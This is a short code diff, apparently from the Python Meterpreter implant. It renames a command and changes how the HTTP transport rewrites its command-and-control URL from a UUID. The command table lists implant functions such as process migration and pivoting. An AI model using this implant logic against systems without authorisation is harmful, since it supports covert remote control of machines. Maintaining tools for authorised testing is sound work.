@@ -228,7 +228,7 @@ COMMAND_IDS = (
     (14, 'core_migrate'),
     (15, 'core_native_arch'),
     (16, 'core_negotiate_tlv_encryption'),
-    (17, 'core_patch_url'),
+    (17, 'core_patch_uuid'),
     (18, 'core_pivot_add'),
     (19, 'core_pivot_remove'),
     (20, 'core_pivot_session_died'),
@@ -1111,11 +1111,11 @@ class HttpTransport(Transport):
         url_h = urllib.urlopen(request, **urlopen_kwargs)
         response = url_h.read()
 
-    def patch_uri_path(self, new_path):
+    def patch_uuid(self, new_uuid):
         match = re.match(r'https?://[^/]+(/.*$)', self.url)
         if match is None:
             return False
-        self.url = self.url[:match.span(1)[0]] + new_path
+        self.url = self.url[:match.span(1)[0]] + '/' + new_uuid
         return True
 
     def tlv_pack_transport_group(self):
@@ -1515,11 +1515,11 @@ class PythonMeterpreter(object):
         response += tlv_pack(TLV_TYPE_STRING, get_native_arch())
         return ERROR_SUCCESS, response
 
-    def _core_patch_url(self, request, response):
+    def _core_patch_uuid(self, request, response):
         if not isinstance(self.transport, HttpTransport):
             return ERROR_FAILURE, response
-        new_uri_path = packet_get_tlv(request, TLV_TYPE_C2_URL)['value']
-        if not self.transport.patch_uri_path(new_uri_path):
+        new_uuid = packet_get_tlv(request, TLV_TYPE_C2_UUID)['value']
+        if not self.transport.patch_uuid(new_uuid):
             return ERROR_FAILURE, response
         return ERROR_SUCCESS, response
 
